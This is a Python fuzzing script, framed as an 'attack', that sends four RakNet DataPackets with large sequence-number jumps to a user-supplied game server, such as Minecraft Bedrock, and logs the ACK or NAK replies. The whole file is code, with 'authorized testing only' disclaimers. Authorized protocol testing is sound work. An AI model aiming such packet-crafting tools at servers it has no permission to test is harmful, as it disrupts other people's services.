#!/usr/bin/env python3
"""
RakNet Sequence Number Attack / Fuzzing Test Script

用途:
  对 RakNet 协议(常见于 Minecraft Bedrock / UDP 游戏服务端)进行 sequence number
  鲁棒性测试。发送 4 个 DataPacket,sequence number 从 1 开始随机递增跳跃,
  最终到达 50000,用于测试服务端对 sequence number 大幅跳跃的处理能力。

注意:
  - 仅用于授权的渗透测试与协议研究。
  - RakNet sequence number 为 24-bit (0 ~ 0xFFFFFF),使用 little-endian。
"""

import argparse
import random
import socket
import sys
import time


# ---------------------------------------------------------------------------
# RakNet 常量
# ---------------------------------------------------------------------------
ID_UNCONNECTED_PING = 0x01
ID_UNCONNECTED_PONG = 0x1C

ID_DATA_PACKET = 0x80       # 0x80 ~ 0x8d: DataPacket (带 sequence number)

MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"

# RakNet sequence number 是 24-bit
SEQ_MAX = 0xFFFFFF


# ---------------------------------------------------------------------------
# 工具函数
# ---------------------------------------------------------------------------
def pack_seq24(seq: int) -> bytes:
    """将 24-bit sequence number 打包为 little-endian 3 字节。"""
    seq &= SEQ_MAX
    return bytes([seq & 0xFF, (seq >> 8) & 0xFF, (seq >> 16) & 0xFF])


def build_data_packet(seq: int, payload: bytes = b"\x00") -> bytes:
    """构造 DataPacket: ID_DATA_PACKET + 24-bit seq + payload。"""
    return bytes([ID_DATA_PACKET]) + pack_seq24(seq) + payload


def build_jump_sequence(start: int = 1, end: int = 50000, jumps: int = 4):
    """
    生成 jumps 个 sequence number,从 start 开始随机递增跳跃到 end。
    中间点随机生成但保证严格递增。
    """
    if jumps < 2:
        return [start]
    # 中间跳跃点:在 (start, end) 之间随机取 jumps-2 个,排序后保证递增
    inner = sorted(random.randint(start + 1, end - 1) for _ in range(jumps - 2))
    return [start] + inner + [end]


# ---------------------------------------------------------------------------
# RakNet 客户端
# ---------------------------------------------------------------------------
class RakNetAttacker:
    def __init__(self, target: str, port: int, timeout: float = 3.0):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(timeout)
        self.addr = (target, port)

    def send_raw(self, data: bytes) -> None:
        self.sock.sendto(data, self.addr)

    def recv_raw(self) -> bytes:
        try:
            data, _ = self.sock.recvfrom(2048)
            return data
        except socket.timeout:
            return b""

    def is_online(self) -> bool:
        """
        宽松在线检测:发送 Unconnected Ping,只要收到任意 UDP 响应即视为在线。
        (很多服务端禁用 offline ping 或返回非标准 PONG,故不强制检查 0x1C)
        """
        ts = (int(time.time() * 1000)).to_bytes(8, "big")
        pkt = bytes([ID_UNCONNECTED_PING]) + ts + MAGIC + b"\x00" * 8
        self.send_raw(pkt)
        return bool(self.recv_raw())

    @staticmethod
    def classify(resp: bytes) -> str:
        """根据响应首字节分类,用于判断服务端是否在处理我们的包。"""
        if not resp:
            return "无响应"
        b = resp[0]
        if b == ID_UNCONNECTED_PONG:
            return "Unconnected Pong (offline 探测响应)"
        if 0xC0 <= b <= 0xC3:
            return f"ACK (0x{b:02X}, 已确认收到 sequence)"
        if 0xC4 <= b <= 0xC7:
            return f"NAK (0x{b:02X}, 否认收到 sequence)"
        if 0x80 <= b <= 0x8D:
            return f"DataPacket (0x{b:02X}, 服务端回传数据)"
        return f"其他 (0x{b:02X})"

    def run(self, start: int, end: int, jumps: int) -> None:
        online = self.is_online()
        if online:
            print(f"[+] 目标在线: {self.addr[0]}:{self.addr[1]}")
        else:
            print(f"[!] 目标 {self.addr[0]}:{self.addr[1]} 未响应 Unconnected Ping")
            print(f"    (部分服务端禁用 offline ping,继续尝试发送攻击包观察 ACK 响应...)")

        seqs = build_jump_sequence(start, end, jumps)
        print(f"[*] 计划发送 {len(seqs)} 个包,sequence 跳跃序列: {seqs}\n")

        ack_count = 0
        for i, s in enumerate(seqs, 1):
            pkt = build_data_packet(s)
            try:
                self.send_raw(pkt)
                # 发送后立即尝试接收服务端响应 (ACK/NAK 等)
                resp = self.recv_raw()
                kind = self.classify(resp)
                if resp and 0xC0 <= resp[0] <= 0xC3:
                    ack_count += 1
                print(f"    [{i}/{len(seqs)}] seq={s:>6d} 已发送 ({len(pkt)}B) -> 响应: {kind}")
            except Exception as e:
                print(f"    [{i}/{len(seqs)}] seq={s} 发送异常: {e}")

        # 收尾:统计服务端处理情况
        print(f"\n[*] 测试完成")
        print(f"    发送 {len(seqs)} 个包,收到 {ack_count} 个 ACK 响应")
        if ack_count > 0:
            print(f"    结论: 服务端在线且在处理 sequence number")
        elif online:
            print(f"    结论: 服务端在线但未对 sequence 跳跃回 ACK (可能已丢弃)")
        else:
            print(f"    结论: 服务端全程无响应 (可能离线或被防火墙过滤)")

    def close(self) -> None:
        self.sock.close()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def parse_target(target: str):
    """解析 'ip:端口' 格式,返回 (ip, port)。"""
    if ":" not in target:
        raise argparse.ArgumentTypeError("目标格式应为 <ip:端口>,例如 127.0.0.1:19132")
    ip, _, port = target.rpartition(":")
    try:
        port_num = int(port)
    except ValueError:
        raise argparse.ArgumentTypeError(f"端口无效: {port}")
    if not (0 < port_num < 65536):
        raise argparse.ArgumentTypeError(f"端口超出范围: {port_num}")
    return ip, port_num


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="RakNet sequence number 攻击 / 鲁棒性测试脚本",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例:\n  python3 raknet_sequence_attack.py 127.0.0.1:19132\n  python3 raknet_sequence_attack.py 127.0.0.1:19132 --start 1 --end 50000 --jumps 4",
    )
    p.add_argument("target", help="目标地址,格式 <ip:端口>,例如 127.0.0.1:19132")
    p.add_argument("--start", type=int, default=1, help="起始 sequence number (默认 1)")
    p.add_argument("--end", type=int, default=50000, help="终止 sequence number (默认 50000)")
    p.add_argument("--jumps", type=int, default=4, help="跳跃次数 (默认 4)")
    p.add_argument("-t", "--timeout", type=float, default=3.0,
                   help="socket 接收超时秒数 (默认 3.0)")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    ip, port = parse_target(args.target)

    print("=" * 60)
    print(" RakNet Sequence Number Attack / Fuzzing Tool")
    print("=" * 60)
    print(f" 目标     : {ip}:{port}")
    print(f" 跳跃范围 : {args.start} -> {args.end}  ({args.jumps} 次)")
    print(f" 超时     : {args.timeout}s")
    print("=" * 60)
    print(" ⚠ 仅用于授权的安全测试与协议研究,禁止用于非法用途。\n")

    attacker = RakNetAttacker(ip, port, args.timeout)
    try:
        attacker.run(args.start, args.end, args.jumps)
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
    finally:
        attacker.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
